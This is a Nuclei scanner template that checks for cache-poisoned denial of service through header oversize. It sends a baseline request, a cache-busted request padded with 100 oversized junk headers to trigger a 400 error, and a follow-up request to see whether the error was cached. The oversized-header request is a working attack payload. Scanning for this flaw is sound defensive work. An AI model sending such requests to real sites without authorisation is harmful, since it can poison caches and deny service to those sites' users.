id: header-oversize-cache-posioning

info:
  name: Header Oversize - Cache Posioning
  author: omkar7505
  severity: high
  reference:
    - https://cpdos.org/
  description: |
    Header Oversize - Cache Posioning
  tags: omkar7505,cache

variables:
  rand: "{{rand_text_numeric(5)}}"
  
flow: http(1) && http(2) && http(3)
  
http:
  - raw:
      - |
        GET /?doesnotexist=1 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0

      - |
        GET /?cb={{rand}} HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
        X-000000000000000000000000000000000000000000000000001: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000002: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000003: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000004: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000005: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000006: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000007: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000008: 00000000000000000000000000000000000000000000000000
        X-000000000000000000000000000000000000000000000000009: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000010: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000011: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000012: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000013: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000014: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000015: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000016: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000017: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000018: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000019: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000020: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000021: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000022: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000023: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000024: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000025: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000026: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000027: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000028: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000029: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000030: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000031: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000032: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000033: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000034: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000035: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000036: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000037: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000038: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000039: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000040: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000041: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000042: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000043: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000044: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000045: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000046: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000047: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000048: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000049: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000050: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000051: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000052: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000053: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000054: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000055: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000056: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000057: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000058: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000059: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000060: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000061: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000062: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000063: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000064: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000065: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000066: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000067: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000068: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000069: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000070: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000071: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000072: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000073: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000074: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000075: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000076: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000077: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000078: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000079: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000080: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000081: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000082: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000083: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000084: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000085: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000086: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000087: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000088: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000089: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000090: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000091: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000092: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000093: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000094: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000095: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000096: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000097: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000098: 00000000000000000000000000000000000000000000000000
        X-0000000000000000000000000000000000000000000000000099: 00000000000000000000000000000000000000000000000000
        X-00000000000000000000000000000000000000000000000000100: 00000000000000000000000000000000000000000000000000

      - |
        GET /?cb={{rand}} HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0


    # unsafe: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 >= 200 && status_code_1 < 500 && status_code_1 != 400"
          - "status_code_2 == 400"
          - "status_code_3 == 400" 
        condition: and
